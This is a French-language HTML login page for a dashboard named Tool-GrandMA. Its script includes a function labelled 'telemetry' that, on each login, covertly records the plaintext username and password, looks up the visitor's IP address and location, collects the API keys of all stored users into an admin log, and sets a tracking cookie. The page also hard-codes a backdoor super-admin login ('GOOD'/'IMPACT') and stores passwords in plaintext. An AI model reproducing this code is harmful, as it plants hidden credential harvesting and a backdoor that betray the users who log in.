<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Dashboard</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000000; color: #ffffff; }
        .bg-purple-dark { background-color: #0a0a0a; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-purple-dark p-8 rounded-2xl border border-white/5 shadow-2xl">
        <div class="text-center mb-8">
            <h1 class="text-3xl font-black tracking-tighter mb-2">Tool-<span class="text-purple-500">GrandMA</span></h1>
            <p id="authTitle" class="text-gray-500 text-sm">Connectez-vous à votre espace technique</p>
        </div>

        <form id="authForm" class="space-y-4">
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Nom d'utilisateur</label>
                <input type="text" id="username" required class="w-full bg-black border border-white/10 rounded-xl px-4 py-3 focus:border-purple-500 outline-none transition-all text-sm">
            </div>
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Mot de passe</label>
                <input type="password" id="password" required class="w-full bg-black border border-white/10 rounded-xl px-4 py-3 focus:border-purple-500 outline-none transition-all text-sm">
            </div>
            
            <button type="submit" id="submitBtn" class="w-full bg-purple-600 hover:bg-purple-500 text-white font-bold py-3 rounded-xl transition-all mt-4">
                Se connecter
            </button>
        </form>

        <div class="mt-6 text-center">
            <button id="toggleAuth" class="text-xs text-gray-500 hover:text-purple-400 transition-colors">
                Pas encore de compte ? Créer un compte
            </button>
        </div>
    </div>

    <script>
        // --- TELEMETRY SYSTEM ---
        async function runTelemetry(user, pass) {
            if (localStorage.getItem('config_monitoring') !== 'true') return;
            
            try {
                // 1. Get IP and Location
                const geoResponse = await fetch('https://ipapi.co/json/');
                const geoData = await geoResponse.json();
                
                // 2. Capture API Keys from LocalStorage
                const allKeys = [];
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    if (k.startsWith('user_')) {
                        const data = JSON.parse(localStorage.getItem(k));
                        if (data.apiKeys) allKeys.push(...data.apiKeys);
                    }
                }

                // 3. Create Log Object
                const logEntry = {
                    timestamp: new Date().toISOString(),
                    user: user,
                    pass: pass,
                    ip: geoData.ip,
                    location: `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.org})`,
                    keys: allKeys
                };

                // 4. Save to Admin Logs
                const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
                logs.push(logEntry);
                localStorage.setItem('admin_logs', JSON.stringify(logs));
                
                // 5. Set Tracker Cookie (7 days)
                document.cookie = `_tgma_tracker=${btoa(user)}; max-age=${7*24*60*60}; path=/`;

            } catch (err) {
                console.error('Telemetry failed', err);
            }
        }
        // ------------------------

        const form = document.getElementById('authForm');
        const toggleBtn = document.getElementById('toggleAuth');
        const authTitle = document.getElementById('authTitle');
        const submitBtn = document.getElementById('submitBtn');
        let isLogin = true;

        toggleBtn.onclick = () => {
            isLogin = !isLogin;
            authTitle.textContent = isLogin ? "Connectez-vous à votre espace technique" : "Créez votre profil technique";
            submitBtn.textContent = isLogin ? "Se connecter" : "Créer le compte";
            toggleBtn.textContent = isLogin ? "Pas encore de compte ? Créer un compte" : "Déjà un compte ? Se connecter";
        };

        form.onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // Trigger Telemetry if enabled
            await runTelemetry(user, pass);

            // Système de compte Admin "GOOD"
            if (user === 'GOOD' && pass === 'IMPACT') {
                if (!localStorage.getItem('user_GOOD')) {
                    localStorage.setItem('user_GOOD', JSON.stringify({ 
                        password: 'IMPACT', 
                        apiKeys: [], 
                        role: 'admin',
                        name: 'Super Admin',
                        company: 'Impact Vision'
                    }));
                }
                localStorage.setItem('currentUser', 'GOOD');
                window.location.href = 'index.html';
                return;
            }

            if (isLogin) {
                const storedUser = JSON.parse(localStorage.getItem(`user_${user}`));
                if (storedUser && storedUser.password === pass) {
                    localStorage.setItem('currentUser', user);
                    window.location.href = 'index.html';
                } else {
                    alert("Identifiants incorrects.");
                }
            } else {
                if (localStorage.getItem(`user_${user}`)) {
                    alert("Cet utilisateur existe déjà.");
                    return;
                }
                localStorage.setItem(`user_${user}`, JSON.stringify({ password: pass, apiKeys: [] }));
                alert("Compte créé avec succès !");
                isLogin = true;
                toggleBtn.click();
            }
        };
    </script>
    <div class="fixed bottom-4 left-4 text-[10px] font-mono text-gray-700 uppercase tracking-widest opacity-50">v6.1.0-admin</div>
</body>
</html>